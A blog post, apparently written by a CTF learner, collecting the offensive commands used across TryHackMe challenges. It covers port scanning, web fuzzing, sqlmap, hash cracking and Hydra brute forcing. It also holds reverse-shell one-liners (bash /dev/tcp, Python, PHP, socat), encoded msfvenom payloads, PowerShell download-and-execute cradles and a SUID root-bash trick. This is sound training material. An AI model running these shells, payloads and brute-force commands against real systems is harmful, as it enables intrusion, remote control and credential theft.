---
title: Essential Hacking Tools for CTF Success
date: 2024-06-28
description: A curated list of my most effective and frequently used hacking tools for Capture the Flag challenges.
---

<style type="text/css">
td {
    padding:0 15px;
}

.force-word-wrap pre code {
  white-space : pre-wrap !important;
}
</style>

<p style="text-align:center;">
    <img src="/ctf_flag.jpeg" width="300" class="center">
</p>

<h2 class="border-bottom mb-3 mt-5">Content in this Blog Post</h2>

In this blog post I will discuss the hack tools I used most throughout tons of CTF's


<h2 class="border-bottom mb-3 mt-5">Hack tools I used most</h2>

Over the past six months, I have been diving into countless Capture the Flag (CTF) challenges on TryHackMe.com, a very good platform for learning about cybersecurity. CTFs are a crucial part of cybersecurity education, involving breaking into misconfigured (often outdated) systems and extracting text from a specific file to demonstrate successful access. This process is incredibly addictive and as enjoyable as playing a great video game.

A significant aspect of excelling at CTFs is mastering the tools at your disposal. At first, the sheer variety of tools can be overwhelming, making it easy to overlook some of them or forget about them. To keep track, I have been documenting all the tools and commands I frequently use, find particularly effective, or consider less obvious.


<h2 class="border-bottom mb-3 mt-5">Table of contents</h2>

- [nmap](#nmap)
- [passive recon](#passive-recon)
- [rustscan](#rustscan)
- [web enumeration](#web-enumeration)
- [subdomain enumeration](#subdomain-enumeration)
- [useful wordlists for web enumeration](#useful-wordlists-for-web-enumeration)
- [smb enumeration](#smb-enumeration)
- [nfs](#nfs)
- [ftp enumeration](#ftp-enumeration)
- [john](#john)
- [sqlmap](#sqlmap)
- [GTFO bins](#gtfo-bins)
- [root bash](#root-bash)
- [searchsploit](#searchsploit)
- [find commands](#find-commands)
- [tty from reverse shell](#tty-from-reverse-shell)
- [reverse shells](#reverse-shells)
- [reverse shells documentation](#reverse-shells-documentation)
- [nc](#nc)
- [listeners](#listeners)
- [Hydra](#hydra)
- [image analysis](#image-analysis)
- [socat](#socat)
- [chisel, tunnel through firewalls](#chisel-tunnel-through-firewalls)
- [Start python server to share files](#start-python-server-to-share-files)
- [hash identification](#hash-identification)
- [wordlists](#wordlists)
- [metasploit](#metasploit)
- [cypher solving](#cypher-solving)
- [Connect to windows with remote desktop protocol](#connect-to-windows-with-remote-desktop-protocol)
- [curl on windows](#curl-on-windows)
- [pcap analysis](#pcap-analysis)
- [Linux privilege escalation](#linux-privilege-escalation)
- [Binary editing with vim](#binary-editing-with-vim)
- [gpg](#gpg)
- [ssh](#ssh)
- [smtp](#smtp)
- [pop3](#pop3)
- [mysql](#mysql)
- [radare2](#radare2)
- [general buffer overflow tips](#general-buffer-overflow-tips)
- [base64](#base64)


<h3 class="border-bottom mb-3 mt-5" id="nmap">nmap</h3>

The most well known port scanning tool. Slow but can do it all!

```
sudo nmap -Ss 192.168.2.0/24
sudo nmap -A 192.168.2.20
sudo nmap -O -sV 192.168.2.20
sudo nmap -sV 192.168.2.20 -vv
sudo nmap -sN 192.168.2.20 -vvv
nmap --script ssl-enum-ciphers,ssl-heartbleed -p 443 54.78.87.128
```

<h3 class="border-bottom mb-3 mt-5" id="passive-recon">passive recon</h3>

```
whois
dig
https://dnsdumpster.com
```

<h3 class="border-bottom mb-3 mt-5" id="rustscan">rustscan</h3>

My go to tool for scanning ports, extremely fast. It detects open ports first, and then tries to get info about the services on those ports from nmap.
This is a loud tool, i.e. it will trigger alarms when used in reality but who cares when doing CTF's. This is just a pure joy to use.

```
rustscan --ulimit 5000 -r 1-65535 -a 10.10.122.177 -- -A
rustscan -t 2000 --ulimit 5000 -r 1-65535 -a 10.10.176.69 -- -Pn -A -sV
```

<h3 class="border-bottom mb-3 mt-5" id="web-enumeration">web enumeration</h3>

Check out the common flags I used. 

```
gobuster -u http://10.10.10.10 -x "txt,php,html" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir
gobuster -u "10.10.4.137" -x ",txt" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  dir --exclude-length 1763
gobuster -b '301,404' -u "http://10.10.132.226" -x ",html,php" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt dir  # blacklist status codes
ffuf -X POST -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -w "./usernames.txt:USER" -w "./passwords.txt:PASS" -u http://10.10.61.196/login.php -fs 4478  # Set correct headers 
curl http:/10.10.10.10/favicon.ico | md5sum # look up in owasp favicon database
nikto -h http://10.10.10.10
```


<h3 class="border-bottom mb-3 mt-5" id="subdomain-enumeration">subdomain enumeration</h3>

Subfinder works crazy well. Virtual hosting is good to know about.

```
https://crt.sh  # database to look up subdomains
./subfinder -d niekdeschipper.com  # go tool subfinder https://github.com/projectdiscovery/subfinder
ffuf -w ./wordlist.txt -u http://10.10.10.10 -H "Host: FUZZ.website.com" -fs <size>   # detect virtual hosting
```

<h3 class="border-bottom mb-3 mt-5" id="useful-wordlists-for-web-enumeration">useful wordlists for web enumeration</h3>

Very well known wordlists, these I found to be most useful for the CTF's I encoutered.

```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
/usr/share/wordlists/dirb/common.txt 
/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

<h3 class="border-bottom mb-3 mt-5" id="smb-enumeration">smb enumeration</h3>

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.168.119
smbclient //10.10.168.119/anonymous
smbget -R smb://10.10.168.119/anonymous
smbclient -U milesdyson%")s{A&2Z=F^n_E.B\`" //10.10.168.172/milesdyson # example of password login, note the quotes around the password -login
smbclient -W WORKGROUP -U Anonymous //10.10.176.69/profiles
enum4linux -a 10.10.168.172
enum4linux -u milesdyson -p ')s{A&2Z=F^n_E.B`'  -a 10.10.168.172
auxiliary/scanner/smb/smb_login  # metasploit
```

<h3 class="border-bottom mb-3 mt-5" id="nfs">nfs</h3>

```
sudo nmap -p 2049,111 --script='nfs-*' 10.10.52.49 -d
showmount -e 10.10.52.49
```

<h3 class="border-bottom mb-3 mt-5" id="ftp-enumeration">ftp enumeration</h3>

The banner grab can also be used for other services.

```
sudo nmap --script ftp-* -p21 10.10.10.10
nc -nv 10.10.49.133 21  # banner grab
```


<h3 class="border-bottom mb-3 mt-5" id="john">john</h3>

Incredibly useful password hash crack tool, but do a search first check if your password hash is already cracked before saves a lot of time.
Checkout the subformats as well, I had to use that functionality on multiple occasions. If john can't do it, hashcat is another good tool. I only switch to hashcat if john can't do it.

```
john --list=formats
john --list=subformats
john --format=Raw-SHA512 --rules -w=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
# subformat syntax
user:$dynamic_#$hash$salt
john --format=dynamic_82 --rules -w=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
```

<h3 class="border-bottom mb-3 mt-5" id="sqlmap">sqlmap</h3>

Sql injection is very unfun and tedious to do. sqlmap is also very loud, but for CTF's that does not matter, saves a ton of time.

```
sqlmap -u http://10.10.122.177/administrator.php --forms -a
sqlmap -u http://10.10.113.186/portal.php --cookie="PHPSESSID=lr3l0hnc6gm9a4clunvbgv1vt0" --forms -a
sqlmap -r request_file.txt -a       # You could copy requests from burpsuite and use them like this
```

<h3 class="border-bottom mb-3 mt-5" id="gtfo-bins">GTFO bins</h3>

For Linux priv escalatio this is the stuff. For windows you can checkout lolbas.

```
https://github.com/GTFOBins/GTFOBins.github.io
```

<h3 class="border-bottom mb-3 mt-5" id="root-bash">root bash</h3>

Used this whenever possible. 

```
cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
./rootbash -p
```

If you manage to get these lines executed as root you are in. I use this most often when the back up mechanism (run as root) can be manipulate.
This is a very wellknown technique look it up to learn how it works.


<h3 class="border-bottom mb-3 mt-5" id="searchsploit">searchsploit</h3>

Local copy of the exploitdb database. That can you search in the commandline, very useful.

```
searchsploit -w query
searchsploit -p exploitnumber
```

<h3 class="border-bottom mb-3 mt-5" id="find-commands">find commands</h3>

Find is always available on linux systems. I usually run these to find the low hanging fruit before going to priv escalation scripts such as linpeas.
Especially for the easy CTF's these commands can point you to the intended priv escalation vector.

```
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
find / -user your_username 2>/dev/null
find . -type f -executable -print
getcap -r / 2>/dev/null
find / -name root.txt -exec cat {} \; 2>/dev/null 
```

<h3 class="border-bottom mb-3 mt-5" id="tty-from-reverse-shell">tty from reverse shell</h3>

You have a reverse shell but you want a more features. I almost always use these.

```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<h3 class="border-bottom mb-3 mt-5" id="reverse-shells">reverse shells</h3>

Many options for different scenario's

```
nc 10.9.120.244 4444 –e /bin/sh
bash -i >& /dev/tcp/10.11.60.57/4444 0>&1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
php -r '$sock=fsockopen("10.9.120.244",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
msfvenom -p cmd/unix/reverse_netcat lhost=[ip] lport=4444 R
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.60.57 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.60.57 LPORT=5555 -f exe -o reverse.exe
curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php > reverse.php
```


<h3 class="border-bottom mb-3 mt-5" id="reverse-shells-documentation">reverse shells documentation</h3>

```
https://github.com/swisskyrepo/PayloadsAllTheThings
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

<h3 class="border-bottom mb-3 mt-5" id="nc">nc</h3>

A way I like to use to transport files between machines

```
nc -l -p 1234 > out.file
nc -w 3 10.10.10.10 1234 < in.file
```

<h3 class="border-bottom mb-3 mt-5" id="listeners">listeners</h3>

A listener for your reverse shell to connect to. I almost exclusively use nc for this.

```
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

<h3 class="border-bottom mb-3 mt-5" id="hydra">Hydra</h3>

Don't really like this tool. But it can do so much that in most scenario's I end up using it for something and sometimes it leads to results.

```
hydra -l username -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -t 4 ssh://10.10.136.152 -VV
hydra -l user -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -t 16 ssh://10.10.38.109 -VV
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.249.252 ftp
hydra -l username -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.4.137 -V http-form-post '/login:username=^USER^&password=^PASS^:F=failed' -o hydra_results.txt
hydra -L .usernames.txt -p "passwordtospray" ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'    # ntlm passwordspray
```


<h3 class="border-bottom mb-3 mt-5" id="image-analysis">image analysis</h3>

I feel like this is exclusively useful for CTF's I cannot imagine that this is useful in real scenario's. But more often than not stuff is hidden inside images or binaries, and these tools almost always lead to an answer. It does teach you a bit about binaries, file formats in general, meta data, so I understand why it is used so much in CTF's.

```
exiftool
steghide
stegbrute
binwalk
dd if=image.jpg of=hidden.zip bs=1 skip=265845
```


<h3 class="border-bottom mb-3 mt-5" id="socat">socat</h3>

```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0             # listener
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane  # reverse shell
./socat tcp-l:2222,fork,reuseaddr tcp:10.10.10.10:22 &  # start listener on 2222 forward to 10.10.10.10:22
```


<h3 class="border-bottom mb-3 mt-5" id="chisel-tunnel-through-firewalls">chisel, tunnel through firewalls</h3>

Good to know this exist.

```
# Reverse port forward from attack box to remote, localhost:2049 will be forwarded to remote:2049
./chisel server -p 4242 --reverse  # Start reverse server that listens on 4242 on host
./chisel client server_ip:4242 R:2049:localhost:2049 &  # on remote connect back to host and reverse the connection
```

<h3 class="border-bottom mb-3 mt-5" id="start-python-server-to-share-files">Start python server to share files</h3>

Use this all the time. Host your tools, curl them from the target to use them on the target.

```
python -m http.server 8000
sudo python -m http.server 80
```


<h3 class="border-bottom mb-3 mt-5" id="hash-identification">hash identification</h3>

These websites I found most useful for identifying and finding already cracked hashes.

```
https://hashes.com/en/tools/hash_identifier
https://crackstation.net/
https://www.tunnelsup.com/hash-analyzer/
```


<h3 class="border-bottom mb-3 mt-5" id="wordlists">wordlists</h3>

This resource has many super useful wordlists.

```
https://github.com/danielmiessler/SecLists
```

<h3 class="border-bottom mb-3 mt-5" id="metasploit">metasploit</h3>

Very user friendly exploit framework. Especially the meterpreter is very fun to have on windows.
Mostly quite staightforward to use, the things I wrote below are things I forgot sometimes.

**get all exploits**

in meterpreter: `run post/multi/recon/local_exploit_suggester`

**check possible payloads when in exploit**

```
show payloads
```

**Try upgrading to a more capable shell**

```
sessions -u 1  # upgrade session to meterpreter
```

**Dump meterpreter directly on target**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=5555 -f exe -o reverse.exe # dump payload on target
use exploit/multi/handler # listener module
set PAYLOAD windows/meterpreter/reverse_tcp
exploit -j
```

<h3 class="border-bottom mb-3 mt-5" id="cypher-solving">cypher solving</h3>

CTF's like to include cyphers, they are fun to do once, but you encounter them too often in CTF's. Lukily I found these resources to be able to solve almost anything.

```
https://www.cachesleuth.com/multidecoder/
https://book.hacktricks.xyz/crypto-and-stego/crypto-ctfs-tricks
https://gchq.github.io/CyberChef/       # check the auto solver
https://www.guballa.de/vigenere-solver  # vignere solver (use if cypher looks like it can be solved by ROT but can't and requires a key)
https://www.aperisolve.com/             # runs a bunch of steganography tools on images
```


<h3 class="border-bottom mb-3 mt-5" id="connect-to-windows-with-remote-desktop-protocol">Connect to windows with remote desktop protocol</h3>

Good linux rdp tool

```
xfreerdp /u:administrator /p:letmein123! /v:10.10.226.16:3389 /tls-seclevel:1
wlfreerdp /u:administrator /p:letmein123! /v:10.10.226.16:3389 /tls-seclevel:1
```

<h3 class="border-bottom mb-3 mt-5" id="curl-on-windows">curl on windows</h3>

```
Invoke-WebRequest -uri http://10.10.10.10/socat.exe -outfile C:\\Windows\temp\socat.exe
powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.57/reverse.exe','\Windows\Temp\reverse3.exe')
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.10.57:8000/reverse.exe','reverse.exe')"
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.20/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -10.10.10.20 your-ip -Port 4444
```

<h3 class="border-bottom mb-3 mt-5" id="pcap-analysis">pcap analysis</h3>
                        
Also something that CTF's like to do. They give you captured packet files which you have to analyse and obtain credentials from. 
Sometimes tedious to do. tcpick formats those files very well.

```
tcpick -C -yP -r mypcap.pcapng | less -r
tcpick -wR -r mypcapfile  # creates files from tcp stream
```

<h3 class="border-bottom mb-3 mt-5" id="linux-privilege-escalation">Linux privilege escalation</h3>

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
```

<h3 class="border-bottom mb-3 mt-5" id="binary-editing-with-vim">Binary editing with vim</h3>

Fix files that have been broken on purpose.

```
vim -b file
:% !xxd
:% !xxd -r
```

<h3 class="border-bottom mb-3 mt-5" id="gpg">gpg</h3>

```
gpg --import priv.key
gpg --decrypt encrypted.file
```

<h3 class="border-bottom mb-3 mt-5" id="ssh">ssh</h3>

Port forwarding examples with ssh

```
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN  # Local forward, local 8000 to 172.16.0.10:80 through 172.16.0.5
ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN # Local forward to application on target
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN  # Reverse connection, on attacking machine, same result as previous command
ssh -D 8000 user@target.thm -fN  # Port forward to target
```

<h3 class="border-bottom mb-3 mt-5" id="smtp">smtp</h3>

```
msf > auxiliary/scanner/smtp/smtp_enum
msf > auxiliary/scanner/smtp/smtp_version
```

<h3 class="border-bottom mb-3 mt-5" id="pop3">pop3</h3>

```
telnet 10.10.10.10 1234
hydra -s 12345 -l username boris -P ./wordlist.txt -f 10.10.10.10 pop3 -V
```

<h3 class="border-bottom mb-3 mt-5" id="mysql">mysql</h3>

```
msf > auxiliary/admin/mysql/mysql_sql
msf > auxiliary/scanner/mysql/mysql_schemadump 
msf > auxiliary/scanner/mysql/mysql_hashdump
```

<h3 class="border-bottom mb-3 mt-5" id="radare2">radare2</h3>

This tool is amazing. Also its incredibly easy to forget how it works. The commands I find most useful.

```
r2 -d -AA ./program.elf
afl                 # list all functions
db main             # set breakpoints
s main              # see address
v                   # visual mode
VV                  # panel view
Vpp
izz

## in visual mode
?                       # help in visual mode
"                       # Change window type in visual mode
pxr 256@r:SP            # (press e) In the window type stack, change stackview to something sensible
: e stack.size = 512    # Increase the size of the stack
: e asm.describe = true # describe assembly
w                       # window mode, change reorder windows
HJKL                    # resize in window mode
```


<h3 class="border-bottom mb-3 mt-5" id="general-buffer-overflow-tips">general buffer overflow tips</h3>

Tips for trying out buffer overflows with r2

```
https://reverseengineering.stackexchange.com/a/16430  # connecting stdin to radare2 program
https://reverseengineering.stackexchange.com/a/17012  # connecting stdin to radare2 program
https://security.stackexchange.com/a/260639           # be mindfull when fuzzing to check whether you are writing a valid address in rip
```

<h3 class="border-bottom mb-3 mt-5" id="base64">base64</h3>

```
echo -n "asdasdkjhfhj==" | base64 -d
```
